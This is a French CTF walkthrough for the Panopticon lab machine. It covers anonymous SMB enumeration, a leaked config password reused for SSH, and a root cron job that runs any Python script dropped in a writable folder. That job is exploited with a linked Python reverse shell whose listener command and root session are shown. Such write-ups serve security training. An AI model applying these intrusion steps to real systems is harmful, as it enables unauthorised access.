# Solution du CTF Panopticon de Wizard Labs

Emoticon
--------

*Panopticon* est un CTF basé Linux proposé sur [Wizard Labs](https://labs.wizard-security.net/).  

Il est annoncé avec une difficulté de 2/10 donc facile :p   

Lexicon
-------

La machine dispose d'un serveur SSH, d'un serveur web Apache ainsi que des ports 139 et 445 rattachés au service Samba.  

L'utilitaire *enum4linux* est généralement utile pour l'énumération SMB. Il indique ici la présence d'un partage de fichier et la possibilité des connexions anonymes (NULL sessions):  

```plain
 =========================================
|    Nbtstat Information for 10.1.1.34    |
 =========================================
Looking up status of 10.1.1.34
    PANOPTICON      <00> -         B <ACTIVE>  Workstation Service
    PANOPTICON      <03> -         B <ACTIVE>  Messenger Service
    PANOPTICON      <20> -         B <ACTIVE>  File Server Service
    WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
    WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

    MAC Address = 00-00-00-00-00-00

 ==================================
|    Session Check on 10.1.1.34    |
 ==================================
[+] Server 10.1.1.34 allows sessions using username '', password ''
```

Le partage se nomme *public* :  

```plain
[+] Attempting to map shares on 10.1.1.34
//10.1.1.34/public  Mapping: OK, Listing: OK
//10.1.1.34/IPC$    [E] Can't understand response:
```

Et l'énumération des utilisateurs remonte deux entrées intéressantes :  

```plain
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\seer (Local User)
S-1-22-1-1001 Unix User\guest (Local User)
```

Voyons voir ce qu'il y a sur ce partage :  

```plain
$ smbclient -U "" -N -I 10.1.1.34 //panopticon/public
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Jun 17 17:17:11 2018
  ..                                  D        0  Sat Feb 24 20:27:52 2018
  old-site.zip                        N   427943  Sat Feb 24 20:57:47 2018

        15415240 blocks of size 1024. 13458436 blocks available
smb: \> get old-site.zip
getting file \old-site.zip of size 427943 as old-site.zip (772,5 KiloBytes/sec) (average 772,5 KiloBytes/sec)
```

Une fois cette archive décompressée on trouve des identifiants dans le fichier *php-site-master/app/config/config.php* :  

```php
    'database' => array(
        'adapter' => 'mysql',
        'host' => 'localhost',
        'username' => 'seer',
        'password' => 'IS33Something',
        'dbname' => 'php_site'
    ),
```

Silicon
-------

Une recherche rapide dans le code PHP à la recherche de fonctions exploitables (*include*, *require*, *exec*, *passthru* et compagnie) ne retourne rien d'intéressant.  

Peu importe car les identifiants nous ouvrent les portes du serveur SSH :)  

L'utilisateur *seer* fait partie de la plupart des groupes que l'on voit de nos jours sur un système Linux mais n'est pas dans le groupe *sudo*.  

En dehors du flag je remarque un fichier texte intéressant :  

```plain
$ ls -l ..
total 20
drwxrwxrwx 2 root root 4096 Dec  2 16:21 dev_departement
drwxr-xr-x 2 root root 4096 Feb 24  2018 personal
drwxr-xr-x 2 root root 4096 Feb 24  2018 stuff
drwxr-xr-x 2 root root 4096 Feb 24  2018 tools
-rw-r--r-- 1 seer seer   33 Jun 17 16:55 user.txt

seer@Panopticon:~$ cat user.txt
6d3934480b23c0ca3d164cf19fa11946

seer@Panopticon:~$ cat dev_departement/dev.txt
Hello Seer !! You are the only script developper in this departement ... Like I said you , please drop here all your scripts maybe they can make my life easier :)

Brenda&
```

Intéressant... Ça laisse supposer que l'on peut laisser des scripts dans l'un des dossiers et attendre que *Brenda* les exécute.  

Pourtant pas d'utilisateur *brenda* sur le système, juste nous et *root*. On peut donc espérer une escalade de privilèges directement vers root.  

Mais j'ai beau avoir placé un script ou un binaire à différents emplacements autorisés (l'accès est impossible sur certains, voir le résultat de *ls* ci-dessus), rien ne semble exécuté.  

Une recherche sur l'utilisateur courant a remonté une entrée étrange dans */etc/issue* :  

```plain
seer@Panopticon:~$ grep -r seer /etc/ 2> /dev/null
/etc/aliases:root: seer
/etc/issue:2. in /home/seer/flag2.txt
/etc/services:afs3-bos  7007/tcp            # basic overseer process
/etc/subgid:seer:100000:65536
/etc/subuid:seer:100000:65536
/etc/passwd:seer:x:1000:1000:seer,,,:/home/seer:/bin/bash
/etc/group:cdrom:x:24:seer
/etc/group:floppy:x:25:seer
/etc/group:audio:x:29:seer
/etc/group:dip:x:30:seer
/etc/group:video:x:44:seer
/etc/group:plugdev:x:46:seer
/etc/group:netdev:x:108:seer
/etc/group:seer:x:1000:
seer@Panopticon:~$ cat /etc/issue
Welcome to Panopticon.

There are 3 flags to be found.

1. in /home/guest/public/flag1.txt
2. in /home/seer/flag2.txt
3. in /root/flag3.txt

This machine is made in order to test the mindset and not the technical
knowledge, although some basic pentesting experience is needed.

Enjoy and give me some feedback at perselis.e@gmail.com or
at facebook on the name emmanouil perselis.

Made by AXANO
IP: \4
```

Il semble que le premier flag ne soit plus d'actualité. Cela ne nous avance pas plus que ça.  

En revanche la recherche a mis en évidence l'alias mail de *seer* pour root (dans */etc/aliases*) et effectivement au bout d'un moment j'ai la notification d'un mail reçu dans le terminal.  

```plain
seer@Panopticon:~$ mail
"/var/mail/seer": 26307 messages 26307 new
>N   1 seer               Fri Feb 23 21:26  16/729   *** SECURITY information for Panopticon.Panopticon ***
 N   6 Cron Daemon        Sat Feb 24 21:30  35/1495  Cron <root@Panopticon> /home/seer/update.sh
 N  21 Cron Daemon        Sat Feb 24 22:04  44/2198  Cron <root@Panopticon> /home/seer/.update.sh
```

On voit ici que l'utilisateur a 26307 messages dans sa boîte ^\_^.  

*mail* est un vieux programme permettant l'envoi et la lecture du courrier depuis */var/spool/mail*.  

On peut lister les mails avec la commande *'l'*, afficher le contenu d'un message en rentrant son numéro, supprimer avec *'d'* suivi du numéro pour supprimer un email (ou l'astérisque pour tout supprimer) et enfin *'q'* pour quitter.  

Ici on voit qu'une tache *crontab* tente de lancer le script */home/seer/update.sh* ou */home/seer/.update.sh*.  

J'ai donc placé un script qui place un bash setuid à ces emplacements mais au bout d'un moment toujours rien :(.  

Favicon
-------

Finalement nouveau mail reçu :  

```plain
You have new mail in /var/mail/seer
 U2625 Cron Daemon        Sun Dec  2 14:48  23/849   Cron <root@Panopticon> bash /var/tmp/.lol.sh
python3: can't open file '*.py': [Errno 2] No such file or directory
```

J'aurais du aller lire le dernier email directement :p  

On a donc un script dans */var/tmp* qui essaye d'exécuter tous les scripts Python (on suppose dans le même dossier car le script n'est pas lisible) :  

```plain
-rwx------ 1 root root 125 Jun 27 14:38 /var/tmp/.lol.sh
```

J'ai eu recours [au reverse shell PTY Python d'Infodox](https://github.com/infodox/python-pty-shells/blob/master/tcp_pty_backconnect.py) et après un moment ça a payé :  

```plain
$ python2 tcp_pty_shell_handler.py -b 0.0.0.0:7777
root@Panopticon:/home/seer/dev_departement# id
uid=0(root) gid=0(root) groups=0(root)
root@Panopticon:/home/seer/dev_departement# cd /root
root@Panopticon:~# ls
root.txt
root@Panopticon:~# cat root.txt
8b470f864495744fcd8c3dc7b370e889
root@Panopticon:~# crontab -l
# Edit this file to introduce tasks to be run by cron.
#
# Each task to run has to be defined through a single line
# indicating with different fields when the task will be run
# and what command to run for the task
#
# To define the time you can provide concrete values for
# minute (m), hour (h), day of month (dom), month (mon),
# and day of week (dow) or use '*' in these fields (for 'any').#
# Notice that tasks will be started based on the cron's system
# daemon's notion of time and timezones.
#
# Output of the crontab jobs (including errors) is sent through
# email to the user the crontab file belongs to (unless redirected).
#
# For example, you can run a backup of all your user accounts
# at 5 a.m every week with:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/
#
# For more information see the manual pages of crontab(5) and cron(8)
#
# m h  dom mon dow   command

*/2 * * * * bash /var/tmp/.lol.sh
root@Panopticon:~# cat /var/tmp/.lol.sh
cd /home/seer/dev_departement
for f in *.py; do  # or wget-*.sh instead of *.sh
  python3 "$f"   || break # if needed
done
```


*Published November 17 2020 at 13:38*